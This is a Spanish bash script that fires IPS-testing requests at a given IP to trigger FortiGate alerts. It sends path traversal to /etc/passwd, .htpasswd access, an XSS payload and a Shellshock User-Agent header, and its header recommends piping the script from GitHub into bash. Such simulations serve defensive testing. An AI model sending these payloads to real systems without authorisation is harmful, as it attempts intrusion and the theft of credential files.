#!/bin/bash

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para instalar realizar ataques IPS a un FortiGate
#
# Ejecución remota con sudo:
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Simular-Ataque-IPS-Fortigate.sh | bash
# ----------

# Definir constantes de color
  cColorAzul="\033[0;34m"
  cColorAzulClaro="\033[1;34m"
  cColorVerde='\033[1;32m'
  cColorRojo='\033[1;31m'
  # Para el color rojo también:
    #echo "$(tput setaf 1)Mensaje en color rojo. $(tput sgr 0)"
  cFinColor='\033[0m'

# Comprobar si el paquete curl está instalado. Si no lo está, instalarlo.
  if [[ $(dpkg-query -s curl 2>/dev/null | grep installed) == "" ]]; then
    echo ""
    echo -e "${cColorRojo}  El paquete curl no está instalado. Iniciando su instalación...${cFinColor}"
    echo ""
    sudo apt-get -y update
    sudo apt-get -y install curl
    echo ""
  fi

# Definir constantes de color
  cColorAzul="\033[0;34m"
  cColorAzulClaro="\033[1;34m"
  cColorVerde='\033[1;32m'
  cColorRojo='\033[1;31m'
  # Para el color rojo también:
    #echo "$(tput setaf 1)Mensaje en color rojo. $(tput sgr 0)"
  cFinColor='\033[0m'

# Definir la cantidad de argumentos esperados
  cCantParamEsperados=1

# Comprobar que se hayan pasado la cantidad de parámetros correctos y proceder
  if [ $# -ne $cCantParamEsperados ]; then
    echo ""
    echo -e "${cColorRojo}  Mal uso del script. El uso correcto sería: ${cFinColor}"
    echo "    $0 [IPDeDestino]"
    echo ""
    echo "  Ejemplo:"
    echo "    $0 '172.16.0.209'"
    echo ""
    exit
  fi

vIP="$1"

# Alerta: Web.Server.Password.File.Access
  curl -X GET "http://"$vIP":80/../../etc/passwd"

# Alerta: HTPasswd.Access
  curl -X GET "http://"$vIP":80/.htpasswd"

# Alerta: Cross.Site.Scripting
  curl -X GET "http://"$vIP":80/search?query=<script>alert('XSS')</script>"

# Alerta: Generic.Path.Traversal.Detection
  curl -X GET "http://"$vIP":80/index.php?page=../../../../etc/passwd"

# Alerta: Bash.Function.Definitions.Remote.Code.Execution
  curl -X GET "http://"$vIP":80" -H "User-Agent: () { :; }; echo 'Exploit'"
